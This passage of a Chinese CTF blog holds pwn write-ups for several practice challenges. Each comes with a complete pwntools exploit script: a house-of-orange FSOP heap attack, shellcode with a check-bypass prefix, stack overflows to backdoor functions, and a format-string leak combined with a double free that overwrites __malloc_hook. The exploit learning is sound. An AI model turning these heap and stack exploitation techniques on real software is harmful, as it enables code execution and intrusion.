p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    p.sendline(str(choice))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"turned on(0 ~ 5):"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"wind turbine: "</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"Your name:"</span>)</span><br><span class="line">    p.send(str(content))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">" viewed: "</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"turbine:"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"Please input: "</span>)</span><br><span class="line">    p.send(str(content))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x90</span>,<span class="string">'winter'</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x90</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0xf61</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x1000</span>,<span class="string">'winter'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x400</span>,<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>)<span class="number">-0x39C161</span></span><br><span class="line">log.success(hex(libc_base))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x11</span></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">'a'</span>*<span class="number">0x10</span>)</span><br><span class="line">heapbase = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)<span class="number">-0x61</span></span><br><span class="line">log.success(<span class="string">"heap_base:"</span>+hex(heapbase))</span><br><span class="line"></span><br><span class="line">_IO_list_all = libc_base + libc.sym[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x400</span></span><br><span class="line">fake_file = <span class="string">'/bin/sh\x00'</span> + p64(<span class="number">0x60</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(_IO_list_all<span class="number">-0x10</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xd8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload += fake_file</span><br><span class="line">payload += p64(heapbase + <span class="number">0x588</span>)</span><br><span class="line"><span class="comment">#0x555555f774b0 + 0xd8 - heap_base</span></span><br><span class="line">payload += p64(system) * <span class="number">8</span></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">"turned on(0 ~ 5):"</span>)</span><br><span class="line">p.sendline(str(<span class="number">3</span>))</span><br><span class="line">p.recvuntil(<span class="string">"wind turbine: "</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x90</span>))</span><br><span class="line">    </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0x56 bytes:</span><br><span class="line">    &quot;*** Error in &#96;.&#x2F;wind_farm_panel&#39;: malloc(): memory corruption: 0x00007f49da1f5520 ***\n&quot;</span><br><span class="line">*** Error in &#96;.&#x2F;wind_farm_panel&#39;: malloc(): memory corruption: 0x00007f49da1f5520 ***</span><br><span class="line">$ ls</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    &#39;ls\n&#39;</span><br><span class="line">[DEBUG] Received 0x38 bytes:</span><br><span class="line">    &#39;core  ld-2.23.so  libc-2.23.so\twind.py  wind_farm_panel\n&#39;</span><br><span class="line">core  ld-2.23.so  libc-2.23.so    wind.py  wind_farm_panel</span><br><span class="line">$</span><br></pre></td></tr></table></figure>

<h3 id="参考-amp-下载-1"><a href="#参考-amp-下载-1" class="headerlink" title="参考 &amp; 下载"></a>参考 &amp; 下载</h3><table>
<thead>
<tr>
<th>附件</th>
<th>libc</th>
<th>ld</th>
</tr>
</thead>
<tbody><tr>
<td><a href="wind_farm_panel">点击下载</a></td>
<td><a href="libc-2.23.so">点击下载</a></td>
<td><a href="ld-2.23.so">点击下载</a></td>
</tr>
</tbody></table>
<ol>
<li><a href="https://www.giantbranch.cn/2018/12/29/CTF%20PWN%E4%B9%8Bhouse%20of%20orange/" target="_blank" rel="noopener">https://www.giantbranch.cn/2018/12/29/CTF%20PWN%E4%B9%8Bhouse%20of%20orange/</a></li>
<li><a href="https://b0ldfrev.top/2018/11/06/House-of-orange/#FSOP" target="_blank" rel="noopener">https://b0ldfrev.top/2018/11/06/House-of-orange/#FSOP</a></li>
<li><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/28/orange/" target="_blank" rel="noopener">https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/28/orange/</a></li>
</ol>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>house of orange的步骤：</p>
<ol>
<li><p>栈溢出，修改top chunk的大小。一般保留后三位就行。</p>
</li>
<li><p>top chunk放入了unsortbin</p>
</li>
<li><p>申请一个small bin or large bin（会从unsortbin中切）</p>
</li>
<li><p>泄漏libc（申请回来的第一行数据）</p>
</li>
<li><p>泄漏堆地址（申请回来的第二行数据）</p>
</li>
<li><p>unsortbin attack </p>
<ol>
<li><p>“/bin/sh\x00” + p64(0x61)  =&gt; binsh是作为fp的第一参数，0x61是因为_chains刚好在这儿,</p>
</li>
<li><p>fd随便，bk填<code>libc.symbols[&#39;_IO_list_all&#39;]-0x10</code></p>
</li>
<li><p>接着是_IO_write_base和IO_write_ptr &gt; fp，需要让fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base，故分别填0、1即可</p>
</li>
<li><p>因为vtable的偏移是0xd8，所以都填上0即可（mode需要为0）</p>
</li>
<li><p>在vtable上填上假的构造的即可，这里是system的函数地址</p>
</li>
<li><p>最后修改即可。</p>
</li>
</ol>
</li>
</ol>

	
	</div>
  <a type="button" href="/2021/05/13/house-of-orange/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/05/08/buu每日一题（4）/" >buu每日一题（4）</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-05-08  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h2 id="starctf-2019-babyshell"><a href="#starctf-2019-babyshell" class="headerlink" title="starctf_2019_babyshell"></a>starctf_2019_babyshell</h2><blockquote>
<p>tql，shellcode的题新花样</p>
</blockquote>
<h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><blockquote>
<p>mmap开辟空间，输入shellcode，然后绕过检查即可执行shellcode</p>
</blockquote>
<p><img src="/2021/05/08/buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%884%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210506205132913.png" alt="image-20210506205132913"></p>
<blockquote>
<p>要绕过检查，令第一个字符为空即可。</p>
</blockquote>
<p><img src="/2021/05/08/buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%884%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210506205233682.png" alt="image-20210506205233682"></p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>为了让shellcode正常执行，需要构造一条合法以\x00开头的语句。</p>
<p><code>\x00b\x00</code>、<code>\x00b\x22</code>都是合法语句。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#\x00b\x00</span><br><span class="line">pwndbg&gt; x&#x2F;30gx 0x7f77a00c1000</span><br><span class="line">0x7f77a00c1000:	0x2fb848686a006200&lt;&#x3D;	0x50732f2f2f6e6962</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x&#x2F;30i 0x7f77a00c1000</span><br><span class="line">   0x7f77a00c1000:	add    BYTE PTR [rdx+0x0],ah</span><br><span class="line">   0x7f77a00c1003:	push   0x68</span><br><span class="line">#三个字节组成一个语句</span><br><span class="line"></span><br><span class="line">#同理</span><br><span class="line">pwndbg&gt; x&#x2F;30gx 0x7fb05ae4b000</span><br><span class="line">0x7fb05ae4b000:	0x2fb848686a226200	0x50732f2f2f6e6962</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x&#x2F;30i 0x7fb05ae4b000</span><br><span class="line">   0x7fb05ae4b000:	add    BYTE PTR [rdx+0x22],ah</span><br><span class="line">   0x7fb05ae4b003:	push   0x68</span><br></pre></td></tr></table></figure>

<p>所以，只要在shellcode之前加入’\x00b\x00’即可绕过检查，并正常执行shellcode</p>
<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./starctf_2019_babyshell"</span>)</span><br><span class="line"><span class="comment"># p=remote("node3.buuoj.cn",27975)</span></span><br><span class="line">context.log_level =<span class="string">'debug'</span></span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'\x00b\x22'</span>+asm(shellcraft.sh())</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="wustctf2020-name-your-cat"><a href="#wustctf2020-name-your-cat" class="headerlink" title="wustctf2020_name_your_cat"></a>wustctf2020_name_your_cat</h2><blockquote>
<p>简单的栈题，覆盖返回地址为后门函数即可。</p>
<p>但是不知道为什么，，发送数据为一个地址的话，会导致程序崩溃（无法正常进行下一次的循环），所以要把发送后门地址放在最后一个。</p>
</blockquote>
<p>程序流程：</p>
<ol>
<li>for循环五次</li>
<li>输入一个数字</li>
<li>往8*v+base的地方发送7个字符的数据</li>
</ol>
<p>但是程序没有检查输入的数字大小，而base位于<code>[ebp-34h]</code>的地址，所以在0x34+4的位置存储的就是返回地址，也就是数字7（0x38/8=7），发送后门函数的地址即可。</p>
<h3 id="完整exp-1"><a href="#完整exp-1" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./wustctf2020_name_your_cat"</span>)</span><br><span class="line"><span class="comment"># p = remote("node3.buuoj.cn",26079)</span></span><br><span class="line">elf = ELF(<span class="string">"./wustctf2020_name_your_cat"</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">shell = <span class="number">0x080485CB</span> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(num,payload)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"which"</span>)</span><br><span class="line">	p.sendline(str(num))</span><br><span class="line">	p.recvuntil(<span class="string">"Give your name plz: "</span>)</span><br><span class="line">	p.sendline(payload)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">	add(<span class="number">1</span>,p64(shell))</span><br><span class="line">add(<span class="number">7</span>,p64(shell))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="gyctf-2020-some-thing-interesting"><a href="#gyctf-2020-some-thing-interesting" class="headerlink" title="gyctf_2020_some_thing_interesting"></a>gyctf_2020_some_thing_interesting</h2><blockquote>
<p>printf+uaf</p>
<p>一开始没看到格式化字符串，，，TAT</p>
<p>emm，格式化字符串，泄露%3$p的位置，，，和远程貌似有点不对。。。。<del>知道泄露栈上数据，但是太前面了，gdb都没找到，可以尽量在10附近左右看看</del></p>
</blockquote>
<h3 id="程序流程-1"><a href="#程序流程-1" class="headerlink" title="程序流程"></a>程序流程</h3><ol>
<li><p>格式化字符串部分</p>
<blockquote>
<p>可以输入19个字节，只需要前14个字节可以匹配成功即可。</p>
</blockquote>
</li>
</ol>
<p><img src="/2021/05/08/buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%884%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210507220553456.png" alt="image-20210507220553456"></p>
<blockquote>
<p>前面输入的字符串，存在格式化字符串，有5个字节可以利用，可以用来泄露libc地址</p>
</blockquote>
<p><img src="/2021/05/08/buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%884%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210507220712091.png" alt="image-20210507220712091"></p>
<ol start="2">
<li>正常堆体<ol>
<li>add功能：创建0~0x70大小的块</li>
<li>修改：没有溢出</li>
<li>释放：uaf，其实可以直接修改uaf，不用double free</li>
<li>打印</li>
</ol>
</li>
</ol>
<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ol>
<li>根据格式化字符串，泄露libc地址</li>
<li>根据uaf，申请块到mallochook</li>
<li>覆盖malloc_hook为gadget即可</li>
</ol>
<h3 id="完整exp-2"><a href="#完整exp-2" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process("./gyctf_2020_some_thing_interesting")</span></span><br><span class="line"><span class="comment"># p = remote("node3.buuoj.cn",27779)</span></span><br><span class="line"><span class="comment"># p = process(["./gyctf_2020_some_thing_interesting"],</span></span><br><span class="line">            <span class="comment"># env=&#123;"LD_PRELOAD":"./libc-2.23.so"&#125;)</span></span><br><span class="line">p = process([<span class="string">"/usr/local/glibc-2.23/lib/ld-2.23.so"</span>, <span class="string">"./gyctf_2020_some_thing_interesting"</span>],</span><br><span class="line">            env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"/usr/local/glibc-2.23/lib/libc-2.23.so"</span>&#125;)</span><br><span class="line">elf = ELF(<span class="string">"./gyctf_2020_some_thing_interesting"</span>)</span><br><span class="line"><span class="comment"># libc = ELF("./libc-2.23.so")</span></span><br><span class="line">libc = ELF(<span class="string">"/usr/local/glibc-2.23/lib/libc-2.23.so"</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"&gt; Input your code please:"</span>)</span><br><span class="line">	<span class="comment"># p.sendline("OreOOrereOOreO%3$p")</span></span><br><span class="line">	gdb.attach(p)</span><br><span class="line">	p.sendline(<span class="string">"OreOOrereOOreO%13$p"</span>)</span><br><span class="line">init()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(choice)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"want to do :"</span>)</span><br><span class="line">	p.sendline(str(choice))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">()</span>:</span></span><br><span class="line">	cmd(<span class="number">0</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"OreOOrereOOreO0x"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(o_size,o_content,re_size,re_content)</span>:</span></span><br><span class="line">	cmd(<span class="number">1</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"&gt; O's length : "</span>)</span><br><span class="line">	p.sendline(str(o_size))</span><br><span class="line">	p.recvuntil(<span class="string">"&gt; O : "</span>)</span><br><span class="line">	p.sendline(o_content)</span><br><span class="line">	p.recvuntil(<span class="string">"&gt; RE's length : "</span>)</span><br><span class="line">	p.sendline(str(re_size))</span><br><span class="line">	p.recvuntil(<span class="string">"&gt; RE : "</span>)</span><br><span class="line">	p.sendline(re_content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(oid,o_content,re_content)</span>:</span></span><br><span class="line">	cmd(<span class="number">2</span>)	</span><br><span class="line">	p.recvuntil(<span class="string">"&gt; Oreo ID : "</span>)</span><br><span class="line">	p.sendline(str(oid))</span><br><span class="line">	p.recvuntil(<span class="string">"&gt; O : "</span>)</span><br><span class="line">	p.sendline(o_content)</span><br><span class="line">	p.recvuntil(<span class="string">"&gt; RE : "</span>)</span><br><span class="line">	p.sendline(re_content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(oid)</span>:</span></span><br><span class="line">	cmd(<span class="number">3</span>)	</span><br><span class="line">	p.recvuntil(<span class="string">"&gt; Oreo ID : "</span>)</span><br><span class="line">	p.sendline(str(oid))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span><span class="params">(oid)</span>:</span></span><br><span class="line">	cmd(<span class="number">4</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"&gt; Oreo ID : "</span>)</span><br><span class="line">	p.sendline(str(oid))</span><br><span class="line"></span><br><span class="line">check()</span><br><span class="line">xie = int(p.recv(<span class="number">12</span>).strip(),<span class="number">16</span>)- <span class="number">0xf0</span></span><br><span class="line">libc_base = xie -libc.sym[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">log.success(hex(xie))</span><br><span class="line">log.success(hex(libc_base))</span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">realloc_hook = libc_base + libc.sym[<span class="string">'__libc_realloc'</span>]</span><br><span class="line"></span><br><span class="line">fake_chunk = malloc_hook - <span class="number">0x23</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"aaaa"</span>,<span class="number">0x20</span>,<span class="string">'bbbb'</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"aaaa"</span>,<span class="number">0x20</span>,<span class="string">'bbbb'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># edit(1,'a',p64(fake_chunk))</span></span><br><span class="line">add(<span class="number">0x68</span>,p64(fake_chunk),<span class="number">0x68</span>,p64(fake_chunk))</span><br><span class="line"></span><br><span class="line"><span class="comment"># onegadget = [0x3f3f6,0x3f44a,0xd5c17]</span></span><br><span class="line">onegadget = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"a"</span>,<span class="number">0x68</span>,<span class="string">'b'</span>*<span class="number">0x13</span>+p64(onegadget[<span class="number">3</span>]+libc_base))</span><br><span class="line"><span class="comment"># log.success(hex(onegadget[0]+libc_base))</span></span><br><span class="line"><span class="comment"># p.recvuntil("#######################\n")</span></span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"&gt; O's length : "</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x20</span>))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>本题首先需要细心，能发现格式化字符串，其次，格式化的话，需要找到栈上，在比较后面，stack 30第一个也是%12$p</p>
</blockquote>

	
	</div>
  <a type="button" href="/2021/05/08/buu每日一题（4）/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/05/08/buu每日一题（2）/" >buu每日一题（2）</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-05-08  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h2 id="bjdctf-2020-babystack2"><a href="#bjdctf-2020-babystack2" class="headerlink" title="bjdctf_2020_babystack2"></a>bjdctf_2020_babystack2</h2><blockquote>
<p>简单的，首先通过整数溢出绕过检查，然后栈溢出，存在后门函数，直接执行即可</p>
</blockquote>
<p><img src="/2021/05/08/buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%882%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210506201527291.png" alt="image-20210506201527291"></p>
<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">"./bjdctf_2020_babystack2"</span>)</span><br><span class="line">p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">28526</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x000400726</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"name:"</span>)</span><br><span class="line">p.sendline(str(<span class="number">-1</span>))</span><br><span class="line">p.recvuntil(<span class="string">"name?"</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x10</span>+<span class="number">0x8</span>)+p64(backdoor)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


	
	</div>
  <a type="button" href="/2021/05/08/buu每日一题（2）/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/05/06/ciscn-2019-es-7/" >ciscn_2019_es_7</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-05-06  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<blockquote>
<p>其实做过一次<a href="https://warm-winter.github.io/2020/11/20/buu%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/#12-ciscn-2019-s-3" target="_blank" rel="noopener">第一次wp</a>，，，但是再做还是不太可，重新写一篇【两篇侧重点不一样】</p>
</blockquote>
<h3 id="题目流程"><a href="#题目流程" class="headerlink" title="题目流程"></a>题目流程</h3><blockquote>
<p>两个函数，read和write</p>
</blockquote>
<p><img src="/2021/05/06/ciscn-2019-es-7/image-20210506185234819.png" alt="image-20210506185234819"></p>
<blockquote>
<p>输入和打印的是同一个地址，rsp+buf，buf的长度为0x10。</p>
<p>所以栈溢出的偏移为0x10，再下一个地址是rsp，ret的时候，pop eip会取过来。</p>
</blockquote>
<p><img src="/2021/05/06/ciscn-2019-es-7/image-20210506185325681.png" alt="image-20210506185325681"></p>
<blockquote>
<p>程序给了两个后门函数</p>
<p>第一个是rax，设置0xf，可以进行srop</p>
<p>第二个设置为execve的调用号，设置参数为“/bin/sh”、0、0（必须设置，因为vuln函数中rdi，rsi和rdx都有值）即可get shell</p>
</blockquote>
<p><img src="/2021/05/06/ciscn-2019-es-7/image-20210506185517298.png" alt="image-20210506185517298"></p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>综上，有两种方法可以进行漏洞利用</p>
<ol>
<li>利用gadget2，需要设置三个寄存器参数，可以通过ret2csu来设置</li>
<li>利用gadget1，srop来get shell</li>
</ol>
<blockquote>
<p> 其次，程序还可以泄漏信息，在输入0x10处和0x20处都存在栈上的地址，布置“/bin/sh”在上面，泄漏栈地址，即计算得到binsh的地址。</p>
<p> 为了程序正常返回继续利用，故泄漏0x20的地址。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x7fffffffdee0</span><br><span class="line">0x7fffffffdee0:	0x6161616161616161	0x0000000000000a61#[rsp+buf]</span><br><span class="line">0x7fffffffdef0:	0x00007fffffffdf10	0x0000000000400536</span><br><span class="line">0x7fffffffdf00:	0x00007fffffffdff8	0x0000000100000000</span><br><span class="line">0x7fffffffdf10:	0x0000000000400540	0x00007ffff7a03bf7</span><br><span class="line">0x7fffffffdf20:	0x0000000000000001	0x00007fffffffdff8</span><br></pre></td></tr></table></figure>

